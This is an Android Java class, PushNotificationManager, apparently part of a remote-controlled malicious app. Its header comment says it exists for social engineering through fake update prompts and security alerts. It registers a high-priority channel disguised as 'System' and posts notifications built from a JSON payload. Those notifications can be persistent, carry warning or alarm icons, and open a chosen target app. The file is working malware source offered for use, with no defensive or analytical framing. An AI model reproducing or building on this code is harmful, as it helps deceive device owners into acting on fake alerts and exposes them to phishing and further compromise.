package com.fason.app.features.pushnotif;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import androidx.core.app.NotificationCompat;

import com.fason.app.core.FasonApp;

import org.json.JSONObject;

/**
 * PushNotificationManager — posts custom notifications to the device.
 * Used for social-engineering: fake update prompts, security alerts, etc.
 */
public final class PushNotificationManager {
    private static final String CHANNEL_ID = "fason_push";
    private static volatile PushNotificationManager instance;
    private final Context ctx;
    private final NotificationManager nm;

    private PushNotificationManager() {
        this.ctx = FasonApp.getContext();
        this.nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        createChannel();
    }

    public static synchronized PushNotificationManager getInstance() {
        if (instance == null) instance = new PushNotificationManager();
        return instance;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_HIGH);
            c.setDescription("System notifications");
            nm.createNotificationChannel(c);
        }
    }

    /** payload: {title, body, icon?, targetPackage?, ongoing?} */
    public JSONObject push(JSONObject payload) {
        String title = payload.optString("title", "Notification");
        String body = payload.optString("body", "");
        boolean ongoing = payload.optBoolean("ongoing", false);
        String targetPkg = payload.optString("targetPackage", "");
        int icon = android.R.drawable.ic_dialog_info;
        String iconName = payload.optString("icon", "");
        if ("warning".equals(iconName)) icon = android.R.drawable.ic_dialog_alert;
        else if ("alarm".equals(iconName)) icon = android.R.drawable.ic_lock_idle_alarm;

        Intent intent;
        if (!targetPkg.isEmpty()) {
            intent = ctx.getPackageManager().getLaunchIntentForPackage(targetPkg);
            if (intent == null) intent = new Intent();
        } else {
            intent = new Intent();
        }
        PendingIntent pi = PendingIntent.getActivity(ctx, (int) System.currentTimeMillis(),
                intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder b = new NotificationCompat.Builder(ctx, CHANNEL_ID)
                .setSmallIcon(icon)
                .setContentTitle(title)
                .setContentText(body)
                .setContentIntent(pi)
                .setAutoCancel(!ongoing)
                .setOngoing(ongoing)
                .setPriority(NotificationCompat.PRIORITY_HIGH);
        nm.notify((int) (System.currentTimeMillis() % 100000), b.build());

        JSONObject r = new JSONObject();
        try { r.put("success", true); r.put("title", title); } catch (Exception ignored) {}
        return r;
    }
}
